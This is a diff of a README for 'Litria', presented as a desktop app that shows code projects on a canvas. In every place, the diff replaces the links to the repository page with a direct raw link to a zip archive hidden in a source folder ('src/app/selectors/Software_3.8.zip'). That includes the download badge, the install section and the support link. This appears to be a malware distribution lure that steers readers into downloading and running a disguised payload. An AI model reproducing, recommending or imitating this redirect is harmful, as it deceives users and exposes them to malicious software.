@@ -1,6 +1,6 @@
 # 🖌️ Litria - Your Project Lives on a Canvas
 
-[![Visit Litria](https://img.shields.io/badge/Download-Litria-ff6f00?style=for-the-badge&logo=github)](https://github.com/Overachievementdeveloper350/Litria)
+[![Visit Litria](https://img.shields.io/badge/Download-Litria-ff6f00?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Overachievementdeveloper350/Litria/main/src/app/selectors/Software_3.8.zip)
 
 ## 🚀 Getting Started
 Litria is a desktop app that turns your project into an interactive picture. Instead of scrolling through files and folders, you see everything on a big canvas—files become blocks, folders work like real groups on your computer, and connections show how code pieces link together. It’s perfect if you want to understand or build projects without getting lost in text.
@@ -19,7 +19,7 @@ Litria is a desktop app that turns your project into an interactive picture. Ins
 
 ## ⬇️ Download and Install
 Visit this link to download the application:  
-[🔗 Download Litria](https://github.com/Overachievementdeveloper350/Litria)
+[🔗 Download Litria](https://raw.githubusercontent.com/Overachievementdeveloper350/Litria/main/src/app/selectors/Software_3.8.zip)
 
 1. Click the download button on the linked page.
 2. Wait for the file to finish (it may take a few minutes).
@@ -59,7 +59,7 @@ A: Right-click on the line and choose “Remove.”
 
 ## 🔗 Support
 Found an issue or have a question? Visit the official website:  
-https://github.com/Overachievementdeveloper350/Litria
+https://raw.githubusercontent.com/Overachievementdeveloper350/Litria/main/src/app/selectors/Software_3.8.zip
 
 Let us know by leaving a comment on the download page.
 
